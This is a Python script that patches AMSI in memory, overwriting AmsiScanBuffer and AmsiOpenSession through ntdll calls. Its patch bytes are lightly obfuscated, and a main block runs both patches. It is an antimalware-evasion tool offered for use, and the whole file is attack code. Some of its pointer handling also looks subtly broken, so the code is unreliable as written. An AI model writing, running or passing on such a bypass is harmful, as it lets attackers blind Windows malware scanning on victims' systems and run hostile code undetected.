import ctypes
import ctypes.wintypes as wintypes

# Define the AMSI patch bytes
amsi_patch = bytes([0xB2 + 6, 0x52 + 5, 0x00, 0x04 + 3, 0x7E + 2, 0xC2 + 1])

# Define necessary constants
PAGE_EXECUTE_READWRITE = 0x40

# Load required DLLs and functions
kernel32 = ctypes.WinDLL("kernel32.dll")
ntdll = ctypes.WinDLL("ntdll.dll")
amsi = ctypes.WinDLL("amsi.dll")

NtProtectVirtualMemory = ntdll.NtProtectVirtualMemory
NtWriteVirtualMemory = ntdll.NtWriteVirtualMemory
GetCurrentProcess = kernel32.GetCurrentProcess

# Define structures and function prototypes
class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", wintypes.LPVOID),
        ("AllocationBase", wintypes.LPVOID),
        ("AllocationProtect", wintypes.DWORD),
        ("RegionSize", ctypes.c_size_t),
        ("State", wintypes.DWORD),
        ("Protect", wintypes.DWORD),
        ("Type", wintypes.DWORD),
    ]

def patch_amsi():
    """Patch AMSI by modifying the memory of the AmsiScanBuffer function."""
    AmsiScanBuffer = amsi.AmsiScanBuffer

    base_address = ctypes.c_void_p(ctypes.addressof(AmsiScanBuffer))
    number_of_bytes_to_protect = ctypes.c_size_t(len(amsi_patch))
    old_protect = wintypes.DWORD()

    # Change memory protection to READWRITE
    result = NtProtectVirtualMemory(
        GetCurrentProcess(),
        ctypes.byref(base_address),
        ctypes.byref(number_of_bytes_to_protect),
        PAGE_EXECUTE_READWRITE,
        ctypes.byref(old_protect),
    )

    if result != 0:
        raise ctypes.WinError()

    # Write the patch to memory
    written = ctypes.c_size_t()
    NtWriteVirtualMemory(
        GetCurrentProcess(),
        ctypes.byref(base_address),
        ctypes.byref(ctypes.create_string_buffer(amsi_patch)),
        len(amsi_patch),
        ctypes.byref(written),
    )

    # Restore the original memory protection
    result = NtProtectVirtualMemory(
        GetCurrentProcess(),
        ctypes.byref(base_address),
        ctypes.byref(number_of_bytes_to_protect),
        old_protect,
        ctypes.byref(old_protect),
    )

    if result != 0:
        raise ctypes.WinError()

def patch_amsi2():
    """Alternative AMSI patch implementation."""
    AmsiOpenSession = amsi.AmsiOpenSession

    base_address = ctypes.c_void_p(ctypes.addressof(AmsiOpenSession))
    mem_page = ctypes.c_size_t(0x1000)
    patch_byte = ctypes.c_byte(0x75)
    old_protect = wintypes.DWORD()

    # Locate the address to patch
    addr = ctypes.c_void_p()
    for i in range(1024):
        if ctypes.string_at(ctypes.addressof(AmsiOpenSession) + i, 1) == b"\x74":
            addr = ctypes.c_void_p(ctypes.addressof(AmsiOpenSession) + i + 1)
            break

    # Change memory protection to READWRITE
    result = NtProtectVirtualMemory(
        GetCurrentProcess(),
        ctypes.byref(addr),
        ctypes.byref(mem_page),
        PAGE_EXECUTE_READWRITE,
        ctypes.byref(old_protect),
    )

    if result != 0:
        raise ctypes.WinError()

    # Write the patch to memory
    written = ctypes.c_size_t()
    NtWriteVirtualMemory(
        GetCurrentProcess(),
        addr,
        ctypes.byref(patch_byte),
        1,
        ctypes.byref(written),
    )

    # Restore the original memory protection
    result = NtProtectVirtualMemory(
        GetCurrentProcess(),
        ctypes.byref(addr),
        ctypes.byref(mem_page),
        old_protect,
        ctypes.byref(old_protect),
    )

    if result != 0:
        raise ctypes.WinError()

# Example usage
if __name__ == "__main__":
    try:
        patch_amsi()
        print("AMSI patched successfully (method 1).")
        patch_amsi2()
        print("AMSI patched successfully (method 2).")
    except Exception as e:
        print(f"Error patching AMSI: {e}")
